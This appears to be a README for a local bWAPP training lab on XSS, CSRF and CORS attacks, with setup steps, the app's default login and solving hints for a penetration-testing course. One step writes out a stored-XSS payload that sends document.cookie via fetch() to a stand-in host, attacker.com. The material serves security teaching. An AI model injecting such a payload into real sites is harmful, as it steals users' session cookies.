# bWAPP: Client-Side Attacks (XSS, CSRF, CORS, WebSockets)

## Overview
Exploit Reflected, Stored, and DOM XSS, Cross-Site Request Forgery (CSRF), and Cross-Origin Resource Sharing (CORS) misconfigurations.

- **Default Port / Access**: `8085`
- **Directory**: `Classes/02_web_penetration_tester/12_13_14_15_client_side_attacks/bwapp`

---

## How to Solve & Practice

1. Start the lab: `docker compose up -d` and open `http://localhost:8085/install.php` to initialize the database.
2. Login with `bee` / `bug`.
3. XSS Stored: Inject `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>` in the Blog/Comments page.
4. CSRF: Create an external HTML form that auto-submits a password change request without user confirmation.
5. CORS Misconfiguration: Exploit `Access-Control-Allow-Origin: *` with credentials enabled to leak private user data.

---

## YouTube Walkthroughs & Solving Guides

- [PwnFunction - Cross-Site Request Forgery (CSRF) Explained](https://www.youtube.com/watch?v=eWEgUcHPle0)
- [The Cyber Mentor - Web Application Penetration Testing Course](https://www.youtube.com/watch?v=X4eRbHgRawI)
- [Rana Khalil - Cross-Origin Resource Sharing (CORS) Complete Guide](https://www.youtube.com/watch?v=t5FBwq-kudw)

---

## Quick CLI Control
From the `cyber_lab` root directory:
```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
